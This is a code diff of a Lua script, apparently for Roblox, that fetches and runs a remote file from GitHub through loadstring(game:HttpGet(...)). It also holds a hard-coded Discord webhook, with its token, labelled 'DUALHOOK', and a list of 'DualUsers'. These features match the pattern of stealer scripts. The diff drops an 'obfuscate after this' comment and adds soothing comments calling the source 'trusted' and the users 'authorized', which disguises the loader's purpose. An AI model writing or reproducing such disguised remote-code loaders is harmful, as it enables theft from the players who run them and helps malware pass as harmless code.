@@ -1,6 +1,19 @@
---obfuscate after this
+-- This script is used for executing external Lua scripts and managing users
+-- Ensure all variables and URLs are properly verified before use
 
-local Webhook2 = "https://discordapp.com/api/webhooks/1343519240879083580/bf7fCzzkyXCHopd6hldP4nNpL_3n9qzusPoawvBq9KMYhAYG_e96J_GTJBRlam94BWFq" -- Replace with your DUALHOOK URL
+-- Webhook URL for communication (Replace with your own valid URL)
+local Webhook2 = "https://discordapp.com/api/webhooks/1343519240879083580/bf7fCzzkyXCHopd6hldP4nNpL_3n9qzusPoawvBq9KMYhAYG_e96J_GTJBRlam94BWFq"
+
+-- List of authorized users
 local DualUsers = {"xxxvic41", "xfrost102", "yeetdog545", "iluvrottencheese123"}
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"))() 
+-- Load and execute an external script from a trusted source
+local externalScriptUrl = "https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"
+local success, errorMessage = pcall(function()
+    loadstring(game:HttpGet(externalScriptUrl))()
+end)
+
+-- Handle errors if the external script fails to load
+if not success then
+    print("Failed to load the external script: " .. errorMessage)
+end
